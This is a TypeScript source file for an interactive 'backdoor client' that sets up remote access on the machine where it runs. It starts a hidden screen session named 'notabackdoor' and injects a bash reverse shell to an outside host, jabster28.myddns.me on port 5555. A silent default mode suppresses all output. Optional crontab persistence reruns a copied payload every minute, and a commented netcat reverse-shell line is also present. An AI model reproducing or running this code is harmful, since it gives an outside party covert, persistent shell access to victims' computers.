/* eslint-disable eqeqeq */
/* eslint-disable no-case-declarations */
import boxen from 'boxen';
process.argv = process.argv.slice(1); // nex
import yargs, {boolean, config} from 'yargs';
import 'colors';
// eslint-disable-next-line @typescript-eslint/ban-ts-ignore
// @ts-ignore
import {select, confirm, text} from 'input';
import {exec, spawn} from 'child-process-promise';
import {ascii, windowClear, sleep} from './helpers';
import {readFileSync, writeFileSync} from 'fs';
import {join} from 'path';
import {stdout} from 'process';
// import child from 'child_process';
const argv = yargs
  .usage('Usage: run `$0` and select what ya wanna do')
  .alias('d', 'default')
  .boolean(['d'])
  .describe('d', 'Use the config.json in the ~/.backdoor/ directory').argv;
if (argv.default) console.log = (e: string) => {};
else windowClear();
console.log(argv);

windowClear();
(async () => {
  console.log(boxen("You've successfully installed a backdoor client!"));
  console.log(boxen("(now's a good time to pat yourself on the back)").yellow);
  await sleep(1500);
  console.log('Checking dependencies...');
  try {
    await exec('which screen');
    console.log('screen'.green);
  } catch (e) {
    if (e.stdout == '') throw Error("No 'screen' executable found");
    console.log(boxen('ERROR!!!').red);
    console.error(e);
  }
  let exit = false;
  if (argv.default) {
    let config: {
      screen?: boolean;
    };
    try {
      const {stdout} = await exec('cat ~/.backdoor/config.json');
      config = JSON.parse(stdout);
    } catch (e) {
      console.info(e);
      config = {};
    }
    console.log(config);
    if (config.screen)
      try {
        await exec('screen -ls');
      } catch (e) {
        if (
          e.stdout.includes('No Sockets found') ||
          (e.stdout.includes('There are') && !/notabackdoor/g.exec(e.stdout))
        ) {
          await exec('screen -s sh -dmS notabackdoor');
          await exec(
            'screen -S notabackdoor -X stuff "bash -i >& /dev/tcp/jabster28.myddns.me/5555 0>&1"'
          );
        } else {
          return;
        }
      }
    return;
  }
  while (!exit) {
    const res: string = await select(
      "So, Mr. Hackerman, what's on the agenda?",
      [
        'Websocket reverse TCP',
        'Create Hidden Shell (remote access v1)',
        'Exit',
      ]
    );
    switch (res) {
      case 'Exit':
        exit = true;
        console.log(await ascii('byee !!!'));
        await sleep(1500);
        windowClear();
        return;
      case 'Create Hidden Shell (remote access v1)':
        try {
          const {stdout} = await exec('screen -ls');
        } catch (e) {
          if (e.stdout.includes('No Sockets found')) {
            //
          } else {
            if (/notabackdoor/g.exec(e.stdout)) {
              console.log(boxen('A shell has already been made! Skipping...'));
              continue;
            } else {
              console.log(boxen('ERROR!!!').red);
              console.error(e);
            }
          }
        }
        const daemon = await confirm(
          'Add this to cron (persist after restart)?',
          {
            default: false,
          }
        );
        let path = '';
        if (daemon) {
          while (path.trim() == '')
            path = await text(
              'Paste the payload file path here (or drag it & drop it into the terminal window)'
            );
        }
        // nc localhost 5555 < myfifo | /bin/bash -s "fish; exit" -i > myfifo 2>&1
        console.log(boxen('Making a daemonised screen...'));
        await exec('screen -s sh -dmS notabackdoor');
        await exec(
          'screen -S notabackdoor -X stuff "bash -i >& /dev/tcp/jabster28.myddns.me/5555 0>&1"'
        );
        console.log(boxen('Done!', {padding: 1}).green);
        if (daemon) {
          console.log(boxen('Adding to crontab...'));
          await exec(`mkdir -p ~/.backdoor && cp ${path} ~/.backdoor/darwin`);
          await exec(
            '(crontab -l ; echo "* * * * * ~/.backdoor/darwin foo -d") | crontab -'
          );
          console.log(boxen('Done!', {padding: 1}).green);
          console.log(boxen('Saving config...'));
          await exec(
            "echo '" +
              JSON.stringify({...config, screen: true}) +
              "' > ~/.backdoor/config.json"
          );
          console.log(boxen('Done!', {padding: 1}).green);
        }

        break;
      default:
        windowClear();
        break;
    }
  }
})();
